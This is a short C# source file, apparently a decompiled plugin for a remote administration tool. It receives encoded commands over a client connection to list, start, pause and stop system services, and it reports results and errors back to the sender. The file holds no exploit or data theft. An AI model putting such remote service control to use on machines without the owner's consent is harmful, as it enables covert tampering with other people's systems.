using System;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			switch ((string)array[0])
			{
			case "Refresh":
				Client.Send(LEB128.Write(ServiceManager.Update()));
				break;
			case "Start":
				Client.Send(LEB128.Write(ServiceManager.Start((string)array[1])));
				break;
			case "Pause":
				Client.Send(LEB128.Write(ServiceManager.Pause((string)array[1])));
				break;
			case "Stop":
				Client.Send(LEB128.Write(ServiceManager.Stop((string)array[1])));
				break;
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "Service", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}
}
